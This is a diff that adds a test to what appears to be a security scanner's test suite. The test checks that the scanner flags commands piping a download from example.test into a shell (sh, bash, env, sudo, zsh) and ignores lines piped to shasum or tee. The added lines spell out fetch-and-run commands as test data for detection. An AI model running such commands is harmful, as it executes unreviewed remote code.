@@ -149,6 +149,31 @@ describe("each pattern", () => {
     },
   );
 
+  it("catches a download piped into a shell by path, through env or sudo, and into zsh", () => {
+    const shells = [
+      "+curl -fsSL https://example.test/i.sh | /bin/sh",
+      "+wget -qO- https://example.test/i.sh | /usr/bin/bash",
+      "+curl -fsSL https://example.test/i.sh | /usr/bin/env bash",
+      "+curl -fsSL https://example.test/i.sh | env bash -s",
+      "+curl -fsSL https://example.test/i.sh | sudo -E /bin/bash",
+      "+curl -fsSL https://example.test/i.sh | zsh",
+    ];
+    assert.deepEqual(
+      scan(diff("install.sh", shells)).map((match) => [match.patternId, match.line]),
+      shells.map((_, index) => ["rce.pipe_to_shell", index + 1]),
+    );
+    assert.deepEqual(
+      scan(
+        diff("verify.sh", [
+          "+curl -fsSL https://example.test/i.sh | shasum -a 256",
+          "+curl -fsSL https://example.test/i.sh | tee /tmp/sh",
+          "+curl -fsSL https://example.test/i.sh ||/bin/sh fallback.sh",
+        ]),
+      ),
+      [],
+    );
+  });
+
   it("catches a run: key with the expression on it, and a command built in Python", () => {
     assert.deepEqual(
       scan(
